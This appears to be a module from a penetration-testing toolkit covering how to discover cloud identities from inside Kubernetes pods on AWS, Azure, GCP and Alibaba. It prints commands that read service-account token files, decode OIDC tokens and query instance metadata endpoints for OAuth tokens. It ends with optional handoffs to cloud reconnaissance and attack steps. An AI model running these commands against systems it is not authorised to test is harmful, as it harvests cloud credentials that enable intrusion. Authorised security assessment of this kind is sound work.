# Kubernetes → Cloud Identity

发现云身份只输出候选，不自动进入 cloud 模块。

## AWS EKS

### IRSA

```bash
env | grep -E '^AWS_ROLE_ARN|^AWS_WEB_IDENTITY_TOKEN_FILE'
cat "$AWS_WEB_IDENTITY_TOKEN_FILE" 2>/dev/null | cut -d. -f2 | base64 -d 2>/dev/null | jq
aws sts get-caller-identity
```

### EKS Pod Identity

```bash
env | grep -E '^AWS_CONTAINER_CREDENTIALS_FULL_URI|^AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE'
aws sts get-caller-identity
```

记录 role ARN 和 credential source。

## Azure AKS

Workload Identity：

```bash
env | grep -Ei 'AZURE_CLIENT_ID|AZURE_TENANT_ID|AZURE_FEDERATED_TOKEN_FILE'
```

Managed Identity/IMDS：

```bash
curl -s -H 'Metadata: true' \
 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
```

## GCP GKE

```bash
curl -s -H 'Metadata-Flavor: Google' \
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

Workload Identity Federation for GKE may map K8s SA to Google IAM principal/service account; confirm returned identity and token audience/scope.

## Alibaba ACK / RRSA

```bash
env | grep -Ei 'ALIBABA|ALICLOUD|OIDC|ROLE_ARN'
find /var/run/secrets -type f 2>/dev/null | grep -Ei 'oidc|token'
```

RRSA：

```text
projected K8s SA OIDC token
 → Alibaba STS AssumeRoleWithOIDC
 → RAM Role STS
```

ACK automatically renews the short-lived token; don't copy it as if it were a permanent AccessKey.

## Candidate output

```text
Cloud identity discovered:
Provider: AWS/Azure/GCP/Alibaba
Principal: ...
Credential type: ...
Expiration: ...
Observed permissions: unknown / partial / ...

Optional next step:
- Continue /k8s
- /cloud-recon to enumerate this cloud identity
- /cloud-attack if permissions are already known and operator wants exploitation
```
